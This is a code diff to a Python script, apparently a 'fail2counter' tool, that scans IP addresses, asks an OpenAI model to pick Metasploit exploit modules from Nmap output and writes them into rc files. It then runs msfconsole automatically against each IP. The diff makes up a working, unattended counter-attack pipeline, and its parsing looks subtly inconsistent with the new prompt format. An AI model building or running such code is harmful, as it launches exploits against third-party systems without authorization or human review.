@@ -3,6 +3,7 @@
 import redis
 import subprocess
 import time
+import tempfile
 import requests
 import os
 import re
@@ -58,6 +59,32 @@ EXPLOITS_FILE = "/opt/fail2counter/exploits.txt"
 def log(msg, level="INFO"):
     print(f"[{datetime.utcnow().isoformat()}] [{level}] {msg}")
 
+def write_msf_rc(ip: str, modules: list[str]) -> str:
+    rc_path = f"/tmp/ip-{ip}.rc"
+    with open(rc_path, "w") as f:
+        for mod in modules:
+            f.write(f"use {mod}\n")
+            f.write(f"set RHOSTS {ip}\n")
+            f.write("set RPORT 80\n")  # You can adjust this dynamically later
+            f.write("run\n\n")
+    return rc_path
+
+def run_msf(ip: str, rc_file: str) -> str:
+    output_path = f"/tmp/ip-{ip}.msfout"
+    try:
+        subprocess.run(
+            ["msfconsole", "-q", "-r", rc_file],
+            stdout=open(output_path, "w"),
+            stderr=subprocess.STDOUT,
+            timeout=300
+        )
+        with open(output_path) as f:
+            return f.read()
+    except subprocess.TimeoutExpired:
+        return "[TIMEOUT] Metasploit run exceeded 5 minutes"
+    except Exception as e:
+        return f"[ERROR] Metasploit execution failed: {e}"
+
 
 # Load exploit list
 log(f"Loading Metasploit module list from {EXPLOITS_FILE}")
@@ -77,7 +104,15 @@ Below is a list of available Metasploit modules:
 {exploits_list}
 
 You will be given Nmap results for a scanned IP address. Using the list above, suggest which modules are likely applicable.
-Only return valid Metasploit module paths from the list, no explanations.
+Only return a valid metasploit rc file for each module identified from the list, no explanations.
+
+e.g: 
+
+use exploit/linux/ssh/ceragon_fibeair_known_privkey
+set RHOSTS 192.0.2.1
+set RPORT 22
+run
+
 """
 
 REDIS_PASSWORD = os.environ.get("REDIS_PASSWORD")
@@ -197,5 +232,17 @@ while True:
         log(f"Sending to OpenAI for analysis...")
         result = provider.improve_text(system_prompt, f"Nmap output:\n{nmap_output}")
         log(f"OpenAI response:\n{result}")
+
+        modules = [line.strip() for line in result.strip().splitlines() if line.strip().startswith("exploit/")]
+        if not modules:
+            log(f"No valid Metasploit modules returned for {ip}", level="WARNING")
+            continue
+
+        rc_path = write_msf_rc(ip, modules)
+        log(f"Written Metasploit RC file to {rc_path}")
+
+        msf_result = run_msf(ip, rc_path)
+        log(f"Metasploit output for {ip}:\n{msf_result}")
+
     except Exception as e:
-        log(f"OpenAI processing failed: {e}", level="ERROR")
+        log(f"OpenAI or Metasploit processing failed for {ip}: {e}", level="ERROR")
